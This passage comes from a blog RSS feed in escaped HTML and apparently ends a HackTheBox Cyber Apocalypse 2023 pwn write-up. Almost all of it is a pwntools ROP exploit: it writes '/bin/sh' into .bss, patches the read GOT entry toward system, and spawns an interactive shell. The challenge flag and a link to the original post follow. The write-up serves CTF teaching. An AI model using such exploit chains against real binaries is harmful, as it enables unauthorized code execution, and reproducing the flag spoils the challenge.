+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;system offset in libc from read: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">system_offset&lt;/span>&lt;span class="p">)))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">system_offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">system_offset&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0xffffffffffffffff&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Twos complement of this offset: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">system_offset&lt;/span>&lt;span class="p">)))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">binsh_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">bss&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x10&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/bin/sh string Address: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">binsh_addr&lt;/span>&lt;span class="p">)))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">rsi_r15&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x00000000004011b9&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">gadget&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x004011b2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">add_gadget&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0000000000401108&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">rdi&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x00000000004011bb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0000000000401016&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># stage 1 store string &amp;#34;/bin/sh&amp;#34; in .bss section&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mh">0x48&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rsi_r15&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">binsh_addr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">plt&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;read&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Stage 2 change read@GOT to system@GOT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gadget&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">system_offset&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">got&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;read&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x3d&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">add_gadget&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># call read(&amp;#34;/bin/sh&amp;#34;) = system(&amp;#34;/bin/sh&amp;#34;)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rdi&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">binsh_addr&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ret&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># padding ret &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">plt&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;read&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;/bin/sh&lt;/span>&lt;span class="se">\x00&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flag is: &lt;strong>HTB{r3s0lv3_th3_d4rkn355}&lt;/strong>&lt;/p>
+&lt;h2 id="original-posts">Original Posts&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://fazect.github.io/htb2023/" target="_blank" rel="noopener">From FazeCT&lt;/a>&lt;/li>
 &lt;/ul></description></item><item><title>Cyber Apocalypse 2023: The Cursed Mission - Reverse Engineering</title><link>https://blog.bkisc.com/blog/bkisc/htb2023-re/</link><pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate><guid>https://blog.bkisc.com/blog/bkisc/htb2023-re/</guid><description>
 &lt;details class="toc-inpage d-print-none " open>
 &lt;summary class="font-weight-bold">Table of Contents&lt;/summary>
